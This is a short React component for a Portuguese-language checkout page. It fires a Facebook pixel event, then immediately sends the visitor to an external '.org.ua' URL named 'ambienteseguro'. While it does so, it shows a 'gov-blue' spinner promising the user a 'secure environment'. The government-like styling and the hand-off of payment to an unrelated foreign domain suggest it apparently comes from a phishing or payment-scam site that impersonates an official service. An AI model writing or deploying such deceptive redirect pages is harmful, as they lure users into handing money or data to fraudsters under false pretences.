import { useEffect } from 'react';

export function CheckoutPage() {
    useEffect(() => {
        // Pixel: Início de Checkout
        if (window.fbq) {
            window.fbq('track', 'InitiateCheckout');
        }
        window.location.href = "https://ambienteseguro.org.ua/c/370fa74274";
    }, []);

    return (
        <div className="min-h-screen bg-gray-50 flex items-center justify-center font-sans">
            <div className="text-center p-8">
                <div className="w-16 h-16 border-4 border-gov-blue border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
                <h2 className="text-xl font-bold text-gov-blue mb-2">Redirecionando...</h2>
                <p className="text-gray-600">Você está sendo levado para o ambiente seguro.</p>
            </div>
        </div>
    );
}
